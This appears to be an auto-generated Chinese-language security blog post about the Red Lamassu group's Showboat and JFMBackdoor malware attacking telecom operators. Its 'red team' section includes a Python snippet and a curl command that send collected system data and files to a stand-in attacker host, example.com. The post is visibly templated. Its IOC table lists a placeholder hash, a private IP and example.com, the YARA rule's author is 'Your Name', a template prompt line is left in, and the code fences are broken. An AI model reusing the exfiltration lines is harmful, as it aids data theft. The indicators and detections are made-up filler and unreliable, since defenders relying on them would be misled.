---
layout: post
title:  "中國駭客利用新式惡意程式Showboat、JFMBackdoor攻擊電信業者，鎖定Linux與Windows系統展開滲透"
date:   2026-05-27 20:07:04 +0000
categories: [security]
severity: high
---

# 🔥 解析 Red Lamassu 攻擊組織的 Linux 與 Windows 惡意程式
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `模組化後滲透框架`, `遠端指令執行`, `檔案操作`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Red Lamassu 攻擊組織使用的 Linux 惡意程式 Showboat 屬於模組化後滲透框架，允許攻擊者收集系統資訊、上傳與下載檔案、建立持久化服務等。
* **攻擊流程圖解**:
  1. 攻擊者使用社會工程學手法或其他方式獲得目標系統的初始存取權。
  2. 攻擊者上傳 Showboat 惡意程式到目標系統。
  3. Showboat 惡意程式收集系統資訊並發送到攻擊者控制的伺服器。
  4. 攻擊者使用收集到的資訊來進一步攻擊目標系統。
* **受影響元件**: Linux 系統，特別是那些具有弱密碼或其他安全漏洞的系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要具有目標系統的初始存取權。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義攻擊者控制的伺服器
    server_url = "http://example.com"
    
    # 定義目標系統的 IP 地址
    target_ip = "192.168.1.100"
    
    # 收集系統資訊
    system_info = {
        "os": "Linux",
        "version": "Ubuntu 20.04"
    }
    
    # 發送系統資訊到攻擊者控制的伺服器
    requests.post(server_url, json=system_info)
    
    ```
  *範例指令*: 使用 `curl` 命令上傳檔案到目標系統。

```

bash
curl -X POST -F "file=@/path/to/file" http://example.com/upload

```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全防護，例如使用代理伺服器或 VPN 來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /path/to/file |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Showboat_Malware {
      meta:
        description = "Showboat 惡意程式"
        author = "Your Name"
      strings:
        $a = "Showboat" ascii
      condition:
        $a
    }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic)。

```

sql
SELECT * FROM logs WHERE message LIKE "%Showboat%"

```
* **緩解措施**: 除了更新修補之外，還可以修改系統設定來提高安全性，例如設定強密碼、限制登入嘗試次數等。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **模組化後滲透框架 (Modular Post-Exploitation Framework)**: 一種允許攻擊者收集系統資訊、上傳與下載檔案、建立持久化服務等的框架。
* **遠端指令執行 (Remote Command Execution)**: 一種允許攻擊者在目標系統上執行任意指令的技術。
* **檔案操作 (File Operation)**: 一種允許攻擊者在目標系統上上傳、下載、刪除檔案的技術。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176171)
- [MITRE ATT&CK](https://attack.mitre.org/)


